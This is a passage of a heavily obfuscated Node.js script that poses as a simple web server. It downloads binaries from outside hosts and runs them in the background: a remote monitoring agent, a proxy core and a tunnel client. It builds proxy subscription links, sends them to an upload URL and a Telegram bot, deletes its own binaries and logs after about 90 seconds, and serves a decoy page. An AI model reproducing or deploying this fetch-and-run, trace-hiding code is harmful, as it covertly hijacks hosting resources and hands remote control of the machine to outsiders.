            ;(console[_0x10c49f(0x15a)](_0x10c49f(0xb3) + path[_0x10c49f(0x80)](_0x4b3e66[_0x10c49f(0xf1)]) + _0x10c49f(0xdc)),
              _0x5d1a98(_0x3d45a6 + 0x1))
            return
          }
          _0x44d07f(_0x41dea9)
        })
      }
      _0x5d1a98(0x0)
    })
  })
  try {
    await Promise[_0x3f2494(0xab)](_0x40223c)
  } catch (_0x1b1ac8) {
    console['error']('Error\x20downloading\x20files:', _0x1b1ac8)
    return
  }
  function _0x174fe0(_0x3cacf3) {
    const _0x1a9738 = _0x3f2494,
      _0x2ed710 = 0x1fd
    _0x3cacf3[_0x1a9738(0xfa)]((_0x35ad6e) => {
      const _0x9b5f8 = _0x1a9738
      if (fs['existsSync'](_0x35ad6e))
        try {
          ;(fs[_0x9b5f8(0x10c)](_0x35ad6e, _0x2ed710),
            console[_0x9b5f8(0x15a)](_0x9b5f8(0x18d) + _0x35ad6e + ':\x20' + _0x2ed710[_0x9b5f8(0xc6)](0x8)))
        } catch (_0x2f67ab) {
          console[_0x9b5f8(0x101)](_0x9b5f8(0x13d) + _0x35ad6e + ':\x20' + _0x2f67ab)
        }
    })
  }
  const _0x3daf0f = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath]
  _0x174fe0(_0x3daf0f)
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      const _0x22bcff = NEZHA_SERVER['includes'](':') ? NEZHA_SERVER['split'](':')[_0x3f2494(0x15c)]() : '',
        _0xe927cb = new Set([_0x3f2494(0x164), _0x3f2494(0x16b), _0x3f2494(0x12a), '2087', _0x3f2494(0x123), _0x3f2494(0x7d)]),
        _0x186211 = _0xe927cb[_0x3f2494(0x197)](_0x22bcff) ? _0x3f2494(0x9a) : _0x3f2494(0xf4),
        _0x55c9a2 =
          _0x3f2494(0xbc) +
          NEZHA_KEY +
          _0x3f2494(0x145) +
          NEZHA_SERVER +
          _0x3f2494(0xa5) +
          _0x186211 +
          '\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20' +
          UUID
      fs[_0x3f2494(0x11b)](path[_0x3f2494(0xf5)](FILE_PATH, _0x3f2494(0x78)), _0x55c9a2)
      const _0x57d854 = 'nohup\x20' + phpPath + '\x20-c\x20\x22' + FILE_PATH + _0x3f2494(0x11a)
      try {
        ;(await exec(_0x57d854), console[_0x3f2494(0x15a)](phpName + _0x3f2494(0xa0)), await new Promise((_0xf3a26) => setTimeout(_0xf3a26, 0x3e8)))
      } catch (_0x5be2ad) {
        console[_0x3f2494(0x101)](_0x3f2494(0x17a) + _0x5be2ad)
      }
    } else {
      let _0x36fab3 = ''
      const _0x333f3b = [_0x3f2494(0x164), _0x3f2494(0x16b), _0x3f2494(0x12a), _0x3f2494(0x11f), _0x3f2494(0x123), _0x3f2494(0x7d)]
      _0x333f3b['includes'](NEZHA_PORT) && (_0x36fab3 = _0x3f2494(0x15f))
      const _0x1cc62d =
        _0x3f2494(0x76) +
        npmPath +
        _0x3f2494(0x13e) +
        NEZHA_SERVER +
        ':' +
        NEZHA_PORT +
        _0x3f2494(0x167) +
        NEZHA_KEY +
        '\x20' +
        _0x36fab3 +
        _0x3f2494(0x155)
      try {
        ;(await exec(_0x1cc62d), console[_0x3f2494(0x15a)](npmName + _0x3f2494(0xa0)), await new Promise((_0x22978b) => setTimeout(_0x22978b, 0x3e8)))
      } catch (_0x704b9c) {
        console['error'](_0x3f2494(0x18b) + _0x704b9c)
      }
    }
  } else console[_0x3f2494(0x15a)]('NEZHA\x20variable\x20is\x20empty,skip\x20running')
  const _0x5a40c9 = 'nohup\x20' + webPath + _0x3f2494(0x196) + FILE_PATH + _0x3f2494(0x153)
  try {
    ;(await exec(_0x5a40c9), console[_0x3f2494(0x15a)](webName + _0x3f2494(0xa0)), await new Promise((_0x500a02) => setTimeout(_0x500a02, 0x3e8)))
  } catch (_0x3ff413) {
    console[_0x3f2494(0x101)](_0x3f2494(0xb4) + _0x3ff413)
  }
  if (fs[_0x3f2494(0x175)](botPath)) {
    let _0x43347e
    if (ARGO_AUTH[_0x3f2494(0x107)](/^[A-Z0-9a-z=]{120,250}$/)) _0x43347e = _0x3f2494(0x95) + ARGO_AUTH
    else
      ARGO_AUTH[_0x3f2494(0x107)](/TunnelSecret/)
        ? (_0x43347e = _0x3f2494(0xcc) + path[_0x3f2494(0x179)](FILE_PATH, _0x3f2494(0x132)) + '\x22\x20run')
        : (_0x43347e = _0x3f2494(0xde) + path[_0x3f2494(0x179)](bootLogPath) + _0x3f2494(0xeb) + ARGO_PORT)
    try {
      ;(await exec('nohup\x20\x22' + path[_0x3f2494(0x179)](botPath) + '\x22\x20' + _0x43347e + _0x3f2494(0x18c)),
        console[_0x3f2494(0x15a)](botName + _0x3f2494(0xa0)),
        await new Promise((_0xccfd42) => setTimeout(_0xccfd42, 0x7d0)))
    } catch (_0x1f5814) {
      console['error']('Error\x20executing\x20command:\x20' + _0x1f5814)
    }
  }
  await new Promise((_0x8dc254) => setTimeout(_0x8dc254, 0x1388))
}
function getFilesForArchitecture(_0x2909f2) {
  const _0x2b84a2 = _0x543149,
    _0x5e4d27 = _0x2909f2 === _0x2b84a2(0x7f) ? 'https://arm64.oooen.com' : _0x2b84a2(0xe5),
    _0x2ca06c = _0x2909f2 === _0x2b84a2(0x7f) ? 'https://arm64.ssss.nyc.mn' : _0x2b84a2(0x118),
    _0xd70d2 = [
      { fileName: webPath, fileUrls: [_0x5e4d27 + '/web', _0x2ca06c + _0x2b84a2(0xc9)] },
      { fileName: botPath, fileUrls: [_0x5e4d27 + _0x2b84a2(0xa3), _0x2ca06c + '/bot'] }
    ]
  return (
    NEZHA_SERVER &&
      NEZHA_KEY &&
      (NEZHA_PORT
        ? _0xd70d2['unshift']({ fileName: npmPath, fileUrls: [_0x5e4d27 + _0x2b84a2(0xe7), _0x2ca06c + '/agent'] })
        : _0xd70d2[_0x2b84a2(0x10e)]({ fileName: phpPath, fileUrls: [_0x5e4d27 + '/v1', _0x2ca06c + '/v1'] })),
    _0xd70d2
  )
}
function argoType() {
  const _0x252762 = _0x543149
  if (!ARGO_AUTH || !ARGO_DOMAIN) {
    console[_0x252762(0x15a)](_0x252762(0x178))
    return
  }
  if (ARGO_AUTH[_0x252762(0xd7)]('TunnelSecret')) {
    fs[_0x252762(0x11b)](path['join'](FILE_PATH, _0x252762(0xc1)), ARGO_AUTH)
    const _0x530e72 =
      _0x252762(0xcb) +
      ARGO_AUTH[_0x252762(0x124)]('\x22')[0xb] +
      _0x252762(0xd4) +
      path[_0x252762(0xf5)](FILE_PATH, 'tunnel.json') +
      '\x0a\x20\x20protocol:\x20http2\x0a\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20' +
      ARGO_DOMAIN +
      _0x252762(0x7a) +
      ARGO_PORT +
      _0x252762(0x97)
    fs['writeFileSync'](path[_0x252762(0xf5)](FILE_PATH, 'tunnel.yml'), _0x530e72)
  } else console[_0x252762(0x15a)](_0x252762(0xc5) + ARGO_PORT + _0x252762(0x142))
}
async function waitForQuickTunnelLog(_0x231780 = 0x7530) {
  const _0x30958b = _0x543149,
    _0xa895fc = Date[_0x30958b(0x84)]() + _0x231780
  while (Date[_0x30958b(0x84)]() < _0xa895fc) {
    try {
      if (fs[_0x30958b(0x175)](bootLogPath)) {
        const _0x3c8049 = fs[_0x30958b(0xf7)](bootLogPath, 'utf-8')
        if (/trycloudflare\.com/[_0x30958b(0x8e)](_0x3c8049)) return _0x3c8049
      }
    } catch (_0x4f96a1) {}
    await new Promise((_0x15eae0) => setTimeout(_0x15eae0, 0x3e8))
  }
  return ''
}
async function extractDomains() {
  const _0x1b9207 = _0x543149
  let _0x29d9bc
  if (ARGO_AUTH && ARGO_DOMAIN) ((_0x29d9bc = ARGO_DOMAIN), console[_0x1b9207(0x15a)](_0x1b9207(0xa2), _0x29d9bc), await generateLinks(_0x29d9bc))
  else
    try {
      const _0x58c257 = await waitForQuickTunnelLog(),
        _0x1a2f1e = _0x58c257[_0x1b9207(0x124)]('\x0a'),
        _0x328746 = []
      _0x1a2f1e[_0x1b9207(0xfa)]((_0x3c9527) => {
        const _0x26a9d9 = _0x1b9207,
          _0x5e743c = _0x3c9527[_0x26a9d9(0x107)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/)
        if (_0x5e743c) {
          const _0x5bd40a = _0x5e743c[0x1]
          _0x328746[_0x26a9d9(0xbd)](_0x5bd40a)
        }
      })
      if (_0x328746[_0x1b9207(0xb0)] > 0x0)
        ((_0x29d9bc = _0x328746[0x0]), console[_0x1b9207(0x15a)](_0x1b9207(0xbe), _0x29d9bc), await generateLinks(_0x29d9bc))
      else {
        ;(console['log'](_0x1b9207(0x187)), fs[_0x1b9207(0x146)](path[_0x1b9207(0xf5)](FILE_PATH, _0x1b9207(0x141))))
        async function _0x2d0266() {
          const _0x270366 = _0x1b9207
          try {
            process[_0x270366(0x117)] === _0x270366(0x126)
              ? await exec(_0x270366(0xaa) + botName + _0x270366(0x9c))
              : await exec(_0x270366(0x8f) + botName[_0x270366(0x190)](0x0) + ']' + botName[_0x270366(0x13b)](0x1) + _0x270366(0x11c))
          } catch (_0x38d832) {}
        }
        ;(_0x2d0266(), await new Promise((_0x294cd5) => setTimeout(_0x294cd5, 0xbb8)))
        const _0x189dd3 =
          _0x1b9207(0xde) + path[_0x1b9207(0x179)](bootLogPath) + '\x22\x20--loglevel\x20info\x20--url\x20http://localhost:' + ARGO_PORT
        try {
          ;(await exec('nohup\x20\x22' + path[_0x1b9207(0x179)](botPath) + '\x22\x20' + _0x189dd3 + _0x1b9207(0x18c)),
            console[_0x1b9207(0x15a)](botName + _0x1b9207(0xa0)),
            await new Promise((_0x57892a) => setTimeout(_0x57892a, 0x1770)),
            await extractDomains())
        } catch (_0x55cbd7) {
          console['error'](_0x1b9207(0x87) + _0x55cbd7)
        }
      }
    } catch (_0x540de5) {
      console[_0x1b9207(0x101)]('Error\x20reading\x20boot.log:', _0x540de5)
    }
}
async function getMetaInfo() {
  const _0x37abe4 = _0x543149
  try {
    const _0x3b4fbe = await axios[_0x37abe4(0x119)](_0x37abe4(0x185), { headers: { 'User-Agent': 'Mozilla/5.0', timeout: 0xbb8 } })
    if (_0x3b4fbe[_0x37abe4(0x15d)] && _0x3b4fbe[_0x37abe4(0x15d)][_0x37abe4(0x166)] && _0x3b4fbe[_0x37abe4(0x15d)]['isp'])
      return (_0x3b4fbe[_0x37abe4(0x15d)][_0x37abe4(0x166)] + '-' + _0x3b4fbe['data'][_0x37abe4(0xa1)])[_0x37abe4(0xad)](/\s+/g, '_')
  } catch (_0x4179f8) {
    try {
      const _0xdfae52 = await axios[_0x37abe4(0x119)]('http://ip-api.com/json', { headers: { 'User-Agent': _0x37abe4(0x17f), timeout: 0xbb8 } })
      if (
        _0xdfae52[_0x37abe4(0x15d)] &&
        _0xdfae52[_0x37abe4(0x15d)][_0x37abe4(0x173)] === 'success' &&
        _0xdfae52[_0x37abe4(0x15d)]['countryCode'] &&
        _0xdfae52['data'][_0x37abe4(0x149)]
      )
        return (_0xdfae52[_0x37abe4(0x15d)][_0x37abe4(0xea)] + '-' + _0xdfae52[_0x37abe4(0x15d)][_0x37abe4(0x149)])[_0x37abe4(0xad)](/\s+/g, '_')
    } catch (_0x1a2358) {}
  }
  return _0x37abe4(0x17c)
}
async function getServerIP() {
  const _0x4d8bf1 = _0x543149
  let _0x354b81 = ''
  try {
    const _0x5c61f1 = await axios['get'](_0x4d8bf1(0xf0), { timeout: 0xbb8 })
    _0x354b81 = _0x5c61f1[_0x4d8bf1(0x15d)]['trim']()
  } catch (_0xf3761a) {
    try {
      _0x354b81 = execSync(_0x4d8bf1(0x96))[_0x4d8bf1(0xc6)]()[_0x4d8bf1(0xac)]()
    } catch (_0x57c8b9) {
      try {
        const _0x51ce37 = await axios[_0x4d8bf1(0x119)](_0x4d8bf1(0xf8), { timeout: 0xbb8 })
        _0x354b81 = '[' + _0x51ce37[_0x4d8bf1(0x15d)]['trim']() + ']'
      } catch (_0x1b395b) {
        try {
          _0x354b81 = '[' + execSync('curl\x20-sm\x203\x20ipv6.ip.sb')[_0x4d8bf1(0xc6)]()[_0x4d8bf1(0xac)]() + ']'
        } catch (_0x22326d) {
          console[_0x4d8bf1(0x101)](_0x4d8bf1(0xc8), _0x22326d[_0x4d8bf1(0x168)])
        }
      }
    }
  }
  return _0x354b81
}
async function generateLinks(_0x14cbbc) {
  const _0x573921 = await getMetaInfo(),
    _0x121067 = NAME ? NAME + '-' + _0x573921 : _0x573921,
    _0x1f1680 = await getServerIP()
  return new Promise((_0x1ce225) => {
    setTimeout(() => {
      const _0x58f56d = _0xca60,
        _0x2a9654 = {
          v: '2',
          ps: '' + _0x121067,
          add: CFIP,
          port: CFPORT,
          id: UUID,
          aid: '0',
          scy: _0x58f56d(0xc7),
          net: 'ws',
          type: 'none',
          host: _0x14cbbc,
          path: _0x58f56d(0xb8),
          tls: 'tls',
          sni: _0x14cbbc,
          alpn: '',
          fp: _0x58f56d(0x130)
        }
      let _0x2cf7c6 =
        '\x0avless://' +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        '?encryption=none&security=tls&sni=' +
        _0x14cbbc +
        _0x58f56d(0xa4) +
        _0x14cbbc +
        _0x58f56d(0x159) +
        _0x121067 +
        _0x58f56d(0x131) +
        Buffer[_0x58f56d(0x181)](JSON[_0x58f56d(0xd8)](_0x2a9654))[_0x58f56d(0xc6)](_0x58f56d(0x115)) +
        _0x58f56d(0x12b) +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        '?security=tls&sni=' +
        _0x14cbbc +
        _0x58f56d(0xa4) +
        _0x14cbbc +
        _0x58f56d(0x18e) +
        _0x121067 +
        _0x58f56d(0xbb)
      if (isValidPort(HY2_PORT)) {
        const _0x2636b5 = getCertificateFingerprint(certPath),
          _0x262490 = _0x2636b5 ? _0x58f56d(0xee) + encodeURIComponent(_0x2636b5) : '',
          _0x17659c = _0x58f56d(0x9e) + UUID + '@' + _0x1f1680 + ':' + HY2_PORT + _0x58f56d(0xc2) + _0x262490 + '#' + _0x121067
        _0x2cf7c6 += _0x17659c
      }
      if (isValidPort(REALITY_PORT)) {
        const _0x5b747e =
          _0x58f56d(0xf9) +
          UUID +
          '@' +
          _0x1f1680 +
          ':' +
          REALITY_PORT +
          '?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=' +
          publicKey +
          _0x58f56d(0xd0) +
          _0x121067
        _0x2cf7c6 += _0x5b747e
      }
      if (isValidPort(S5_PORT)) {
        const _0x3ac154 = Buffer[_0x58f56d(0x181)](UUID['substring'](0x0, 0x8) + ':' + UUID['slice'](-0xc))[_0x58f56d(0xc6)]('base64'),
          _0x1f5e1a = '\x0asocks://' + _0x3ac154 + '@' + _0x1f1680 + ':' + S5_PORT + '#' + _0x121067
        _0x2cf7c6 += _0x1f5e1a
      }
      ;(console[_0x58f56d(0x15a)](Buffer['from'](_0x2cf7c6)[_0x58f56d(0xc6)](_0x58f56d(0x115))),
        fs['writeFileSync'](subPath, Buffer[_0x58f56d(0x181)](_0x2cf7c6)[_0x58f56d(0xc6)]('base64')),
        fs[_0x58f56d(0x11b)](listPath, _0x2cf7c6, 'utf8'),
        console['log'](FILE_PATH + '/sub.txt\x20saved\x20successfully'),
        (subContent = Buffer[_0x58f56d(0x181)](_0x2cf7c6)[_0x58f56d(0xc6)](_0x58f56d(0x115))),
        uploadNodes(),
        _0x1ce225(_0x2cf7c6))
    }, 0x7d0)
  })
}
async function uploadNodes() {
  const _0x55832d = _0x543149
  if (UPLOAD_URL) {
    if (!fs[_0x55832d(0x175)](listPath)) return
    const _0x3de6f7 = fs['readFileSync'](listPath, _0x55832d(0x110)),
      _0x5c9ca3 = _0x3de6f7['split']('\x0a')['filter']((_0x3d4d4e) => /(vless|vmess|trojan|hysteria2|socks):\/\//[_0x55832d(0x8e)](_0x3d4d4e))
    if (_0x5c9ca3[_0x55832d(0xb0)] === 0x0) return
    const _0x223082 = JSON[_0x55832d(0xd8)]({ nodes: _0x5c9ca3 })
    try {
      const _0x4522b0 = await axios['post'](UPLOAD_URL + _0x55832d(0x186), _0x223082, { headers: { 'Content-Type': _0x55832d(0x143) } })
      return _0x4522b0 && _0x4522b0['status'] === 0xc8 ? (console['log'](_0x55832d(0x182)), _0x4522b0) : null
    } catch (_0x18a6a1) {
      return null
    }
  } else return
}
function cleanFiles() {
  setTimeout(() => {
    const _0x5ba2a0 = _0xca60,
      _0x59394f = [bootLogPath, configPath, webPath, botPath, listPath, certPath, keyPath]
    if (NEZHA_PORT) _0x59394f['push'](npmPath)
    else NEZHA_SERVER && NEZHA_KEY && _0x59394f[_0x5ba2a0(0xbd)](phpPath)
    process[_0x5ba2a0(0x117)] === _0x5ba2a0(0x126)
      ? exec(_0x5ba2a0(0x133) + _0x59394f[_0x5ba2a0(0xf5)]('\x20') + _0x5ba2a0(0xe6), (_0x3f49e1) => {
          const _0x3ca5bb = _0x5ba2a0
          ;(console[_0x3ca5bb(0x18f)](), alwaysLog(_0x3ca5bb(0x140)), console['log'](_0x3ca5bb(0x83)))
        })
      : exec(_0x5ba2a0(0xf6) + _0x59394f[_0x5ba2a0(0xf5)]('\x20') + _0x5ba2a0(0xb2), (_0x5e096b) => {
          const _0x2a060f = _0x5ba2a0
          ;(console[_0x2a060f(0x18f)](), alwaysLog('App\x20is\x20running'), console['log'](_0x2a060f(0x83)))
        })
  }, 0x15f90)
}
cleanFiles()
async function sendTelegram() {
  const _0x2be58c = _0x543149
  if (!BOT_TOKEN || !CHAT_ID) {
    console[_0x2be58c(0x15a)](_0x2be58c(0x176))
    return
  }
  try {
    const _0x1cbf16 = fs[_0x2be58c(0xf7)](subPath, _0x2be58c(0x10d)),
      _0x3a2660 = _0x2be58c(0x188) + BOT_TOKEN + _0x2be58c(0x163),
      _0xfb2550 = NAME[_0x2be58c(0xad)](/[_*\[\]()~`>#+=|{}.!-]/g, '\x5c$&'),
      _0x25c40a = { chat_id: CHAT_ID, text: '**' + _0xfb2550 + '节点推送**\x0a```' + _0x1cbf16 + _0x2be58c(0x81), parse_mode: _0x2be58c(0xa8) }
    ;(await axios[_0x2be58c(0x13f)](_0x3a2660, null, { params: _0x25c40a }), console[_0x2be58c(0x15a)](_0x2be58c(0x14f)))
  } catch (_0x1d4c51) {
    console[_0x2be58c(0x101)](_0x2be58c(0x14b), _0x1d4c51[_0x2be58c(0x168)])
  }
}
async function startserver() {
  const _0xa085be = _0x543149
  try {
    ;(argoType(),
      deleteNodes(),
      cleanupOldFiles(),
      isValidPort(REALITY_PORT) && generateOrLoadKeyPair(),
      isValidPort(HY2_PORT) && ensureTlsCertificates(certPath, keyPath),
      await generateConfig(),
      await downloadFilesAndRun(),
      await extractDomains(),
      await sendTelegram())
  } catch (_0x155e03) {
    console[_0xa085be(0x101)](_0xa085be(0xc0), _0x155e03)
  }
}
startserver()['catch']((_0x249af3) => {
  const _0x3580cc = _0x543149
  console['error'](_0x3580cc(0x15e), _0x249af3)
})
const server = http[_0x543149(0x129)](async (_0x19413f, _0x4fe2f6) => {
  const _0x24bd9a = _0x543149,
    _0x25818c = _0x19413f['url'][_0x24bd9a(0x124)]('?')[0x0]
  if (_0x25818c === '/' + SUB_PATH) {
    if (subContent) (_0x4fe2f6[_0x24bd9a(0xd6)](0xc8, { 'Content-Type': _0x24bd9a(0x100) }), _0x4fe2f6[_0x24bd9a(0x127)](subContent))
    else
      try {
        const _0x4b8475 = fs['readFileSync'](subPath, _0x24bd9a(0x110))
        ;(_0x4fe2f6[_0x24bd9a(0xd6)](0xc8, { 'Content-Type': _0x24bd9a(0x100) }), _0x4fe2f6['end'](_0x4b8475))
      } catch (_0x256321) {
        ;(_0x4fe2f6[_0x24bd9a(0xd6)](0x1f7, { 'Content-Type': _0x24bd9a(0x100) }), _0x4fe2f6[_0x24bd9a(0x127)](_0x24bd9a(0xd2)))
      }
    return
  }
  if (_0x25818c === '/') {
    try {
      const _0x5312b8 = path[_0x24bd9a(0xf5)](__dirname, _0x24bd9a(0xef)),
        _0x4f41e3 = await fs[_0x24bd9a(0x11e)][_0x24bd9a(0x12f)](_0x5312b8, _0x24bd9a(0x10d))
      ;(_0x4fe2f6[_0x24bd9a(0xd6)](0xc8, { 'Content-Type': _0x24bd9a(0x9d) }), _0x4fe2f6[_0x24bd9a(0x127)](_0x4f41e3))
    } catch (_0x1d1eb8) {
      ;(_0x4fe2f6[_0x24bd9a(0xd6)](0xc8, { 'Content-Type': _0x24bd9a(0x9d) }), _0x4fe2f6[_0x24bd9a(0x127)](_0x24bd9a(0x108)))
    }
    return
  }
  ;(_0x4fe2f6[_0x24bd9a(0xd6)](0x194, { 'Content-Type': _0x24bd9a(0x100) }), _0x4fe2f6['end']('Not\x20Found'))
})
server['listen'](PORT, () => alwaysLog(_0x543149(0x99) + PORT + '!'))
